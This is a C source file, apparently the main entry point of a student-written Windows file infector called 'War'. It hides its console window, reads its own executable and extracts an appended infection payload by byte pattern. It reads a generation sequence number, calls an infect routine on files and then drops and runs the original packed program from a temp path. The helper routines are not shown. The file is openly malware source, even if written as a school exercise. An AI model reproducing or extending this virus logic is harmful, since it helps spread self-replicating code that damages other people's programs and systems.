/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

#include <time.h>
/*
**	Hide and close the current terminal
*/
void				close_console()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);
	FreeConsole();
}

/*
**	Start a new console and relink file descriptor 0, 1, 2
**	then resizing window 300x600 to position x(100) y(100) and disabling resizing
*/
void				start_debug_console()
{
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	HWND hWnd = GetConsoleWindow();
	if (hWnd) {
		SetWindowPos(hWnd, 0, 100, 100, 600, 600, NO_FLAGS);
		SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) &~ WS_SIZEBOX);
	}
}

/*
** Just in case a SEGV is knocking...
*/
void signal_handler(int sig)
{
	printf("Something went wrong, i'm dying... good bye\n");
	//exit (1);
}

char		*get_temp_directory(void)
{
	char	username[101];
	DWORD	username_len = 101;
	char	*tempDirectory = ft_strnew(1000);

	memset(username, '\0', 100);
	GetUserName(username, &username_len);
	asprintf(&tempDirectory, "%s%s%s%s", USER_ABSOLUTE, username, APPDATA_FILE, TEMP_PATH);
	//asprintf(&tempDirectory, ".\\");
	return (tempDirectory);
}

char		*get_temp_executable_path(char *executable_name)
{
	char **split = ft_split_string(executable_name, ".exe");

	if (array_length(split) == 0)
		return (strdup("a.out"));
	return ft_dstrjoin(split[0], " (2).exe", 0);
}

int			get_infection_content_size(char **ptr_content, char *executable_content, int executable_content_size)
{
	int		pattern_position = -1;
	char	patter[] = { PATTERN };

	if ((pattern_position = find_pattern(executable_content, executable_content_size)) == -1) {
		*ptr_content = executable_content;
		return (executable_content_size);
	}
	pattern_position -= sizeof(patter);
	char *result = ft_strnew(pattern_position);

	memcpy(result, executable_content, pattern_position);
	*ptr_content = result;
	return (pattern_position);
}

int			get_sequence(char *infection_content, int infection_content_size)
{
	char patt[] = { 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e };//War version

	for (int i = 0; i < infection_content_size - sizeof(patt); i++) {
		if (memcmp(infection_content + i, patt, sizeof(patt)) == 0) {
			int offset = i + sizeof(patt) + 40;
			char *ptr = infection_content + offset;

			char *seq = ft_strnew(3);

			memcpy(seq, ptr, 3);
			int sequence = atoi(seq);
			if (sequence == 0)
				break ;
			return (sequence);
		}
	}
	return (100);
}

const char fingerprint[] = "War version 1.0 (c)oded by <jguyet> - <frmarinh> - XXXXXXXXX";

/*
**	Main entry point
*/
int					main(int argc, char **argv, char **env)
{
	bool debug = true;
	setlocale(LC_CTYPE, "");
	signal(SIGSEGV, signal_handler);
	srand(time(NULL));
	if (debug == true) {
		start_debug_console();
	}
	//INFECTION
	char	*executable_content = NULL;
	int		executable_content_size = 0;
	if ((executable_content_size = windows_file_get_contents_size(&executable_content, argv[0])) <= 0)
		return (0);
	char *infection_content = NULL;
	int infection_size = get_infection_content_size(&infection_content, executable_content, executable_content_size);
	if (infection_size == 0)
		return (0);
	int sequence = get_sequence(infection_content, infection_size);
	infect(argv[0], infection_content, infection_size, sequence);
	//RUNNING
	char *temp_path = get_temp_executable_path(argv[0]);
	bool running = run_packed_executable(temp_path, executable_content, executable_content_size, argv, env);
	while (debug == true && 1);
	return (0);
}
